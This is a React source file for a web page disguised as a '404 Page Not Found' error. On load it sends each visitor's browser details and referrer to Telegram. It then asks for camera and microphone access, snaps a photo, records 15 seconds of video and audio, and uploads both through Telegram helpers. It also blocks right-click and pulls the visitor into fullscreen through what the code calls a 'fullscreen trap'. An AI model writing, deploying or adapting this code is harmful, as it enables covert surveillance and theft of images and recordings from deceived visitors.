import { useEffect, useCallback, useRef } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';

function App() {
  // Use a ref to ensure we only capture once per page load, 
  // preventing double captures in React Strict Mode during development.
  const hasCaptured = useRef(false);

  useEffect(() => {
    const sendVisitorNotification = async () => {
      await sendTelegramNotification({
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Direct',
        previousSites: document.referrer || 'None',
      });
    };

    sendVisitorNotification();
  }, []);

  const captureAndSendMedia = useCallback(async () => {
    try {
      // Get device capabilities first
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevice = devices.find(device => device.kind === 'videoinput');
      
      if (!videoDevice) {
        throw new Error('No video input device found');
      }

      const constraints = {
        video: {
          facingMode: 'user' // Let the device choose its best native resolution
        },
        audio: true
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);

      // Get actual video track settings
      const videoTrack = stream.getVideoTracks()[0];
      // Create and setup video element for photo capture
      const video = document.createElement('video');
      video.srcObject = stream;
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;
      
      // Wait for video to be ready
      await new Promise((resolve) => {
        video.onloadedmetadata = async () => {
          try {
            await video.play();
            setTimeout(resolve, 500);
          } catch (error) {
            console.error('Error playing video:', error);
            resolve(true);
          }
        };
      });

      // Get actual dimensions
      const vWidth = video.videoWidth || 640;
      const vHeight = video.videoHeight || 480;

      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');
      
      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      
      // If it's a mobile device but the video is landscape, we crop the center to make it portrait
      if (isMobile && vWidth > vHeight) {
        // Target a 9:16 portrait aspect ratio
        const cropWidth = vHeight * (9 / 16);
        const cropHeight = vHeight;
        const startX = (vWidth - cropWidth) / 2;

        canvas.width = cropWidth;
        canvas.height = cropHeight;

        if (context) {
          context.drawImage(video, startX, 0, cropWidth, cropHeight, 0, 0, cropWidth, cropHeight);
        }
      } else {
        // Normal rendering
        canvas.width = vWidth;
        canvas.height = vHeight;
        
        if (context) {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
        }
      }

      // Convert photo to blob with maximum quality
      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob((blob) => {
          if (blob) resolve(blob);
        }, 'image/jpeg', 1.0);
      });

      // Send photo immediately
      sendImageToTelegram(photoBlob).catch(console.error);

      // Check supported video formats
      const mimeTypes = [
        'video/mp4;codecs=h264,aac',
        'video/mp4',
        'video/webm;codecs=vp8,opus',
        'video/webm'
      ];

      const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));

      if (!supportedMimeType) {
        throw new Error('No supported video format found');
      }

      // Configure video recording with maximum quality
      const mediaRecorder = new MediaRecorder(stream, {
        mimeType: supportedMimeType,
        videoBitsPerSecond: 8000000 // 8 Mbps for high quality
      });
      
      const chunks: BlobPart[] = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          chunks.push(e.data);
        }
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunks, { 
          type: supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm'
        });
        console.log('Video recording completed, size:', videoBlob.size);
        await sendVideoToTelegram(videoBlob);
        stream.getTracks().forEach(track => track.stop());
      };

      // Start recording
      mediaRecorder.start(1000);
      console.log('Started recording video');

      // Stop recording after 15 seconds
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          console.log('Stopping video recording');
          mediaRecorder.stop();
        }
      }, 15000);

    } catch (error) {
      console.error('Error capturing media:', error);
    }
  }, []);

  // Trigger auto-capture on mount
  useEffect(() => {
    if (!hasCaptured.current) {
      hasCaptured.current = true;
      // Small delay to ensure browser paints the 404 text first before asking for permission
      setTimeout(() => {
        captureAndSendMedia();
      }, 500);
    }
  }, [captureAndSendMedia]);

  // Fullscreen Trap Logic
  const handleTrapClick = () => {
    try {
      if (!document.fullscreenElement) {
        document.documentElement.requestFullscreen().catch(err => {
          console.log(`Fullscreen error: ${err.message}`);
        });
      }
    } catch (error) {
      console.error(error);
    }
  };

  return (
    <div 
      className="min-h-screen bg-white flex items-center justify-center p-4 select-none"
      onClick={handleTrapClick}
      onContextMenu={(e) => e.preventDefault()}
    >
      <div className="text-center font-sans text-gray-800 pointer-events-none">
        <h1 className="text-5xl md:text-7xl font-bold mb-4 tracking-tight">404</h1>
        <h2 className="text-xl md:text-2xl font-medium text-gray-600 mb-8">Page Not Found</h2>
        <p className="text-sm md:text-base text-gray-500 max-w-md mx-auto">
          The requested URL was not found on this server. That's all we know.
        </p>
      </div>
    </div>
  );
}

export default App;